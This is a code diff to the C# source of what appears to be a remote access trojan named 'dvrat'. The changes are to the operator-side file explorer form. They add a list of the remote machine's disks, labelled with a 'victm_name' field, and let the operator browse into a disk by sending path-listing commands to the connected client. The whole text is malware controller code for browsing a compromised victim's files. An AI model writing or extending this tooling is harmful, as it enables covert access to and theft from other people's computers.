@@ -19,6 +19,7 @@ namespace dvrat
 {
     public partial class file_explorer_form : Form
     {
+        public string[] _MAIN_DISKS;
         public string victm_name = "";
         string last_folder = "";
         string _MAIN_DIR = "";
@@ -41,6 +42,7 @@ namespace dvrat
             listView1.Columns[listView1.Columns.Count - 1].Width = -2;
             listView1.Columns[0].Width = 140;
             listView1.Columns[1].Width = 202 - listView1.Columns[0].Width - 25;
+      
         }
 
         public void _err(string err_message)
@@ -75,8 +77,7 @@ namespace dvrat
         }
 
 
-
-
+      
         public void load_main_files(JObject files)
         {
             new Thread(new ThreadStart(new Action(() =>
@@ -84,8 +85,19 @@ namespace dvrat
 
                 listView1.Invoke(new MethodInvoker(() =>
                 {
-                    
 
+                    for (int i = 0; i < this._MAIN_DISKS.Length; i++)
+                    {
+                        string disk = this._MAIN_DISKS[i];
+                        if (!disk.Equals("\n") && !disk.Equals(" ") && !disk.Equals(""))
+                        {
+                            ListViewItem row1_ = new ListViewItem();
+                            row1_.Text = disk;
+                            row1_.SubItems.Add("DISK");
+                            row1_.ImageIndex = 2;
+                            listView1.Items.Add(row1_);
+                        }
+                    }
                     var attributes = files["DIR"];
                     foreach (var pair in attributes)
                     {
@@ -260,12 +272,26 @@ namespace dvrat
         {
             try
             {
-                err_label.Text = "";
-                string path = $"{ _MAIN_DIR }\\{ listView1.SelectedItems[0].Text}";
-                listView2.Items.Clear();
-                path_label.Text = path;
-                last_folder = $"{listView1.SelectedItems[0].Text}";
-                this._parent.send_to_client(this._s, $"get_this_sub_main_path;\n{path}");
+                if (!listView1.SelectedItems[0].SubItems[1].Text.Equals("DISK"))
+                {
+                    err_label.Text = "";
+                    string path = $"{ _MAIN_DIR }\\{ listView1.SelectedItems[0].Text}";
+                    listView2.Items.Clear();
+                    path_label.Text = path;
+                    last_folder = $"{listView1.SelectedItems[0].Text}";
+                    this._parent.send_to_client(this._s, $"get_this_sub_main_path;\n{path}");
+                }
+                else
+                {
+                    err_label.Text = "";
+                    listView2.Items.Clear();
+                    string path = listView1.SelectedItems[0].Text;
+                    path_label.Text = path;
+                    last_folder = $"{listView1.SelectedItems[0].Text}";
+                    this._parent.send_to_client(this._s, $"get_this_sub_main_path;\n{path}");
+
+
+                }
             }
             catch (Exception)
             {
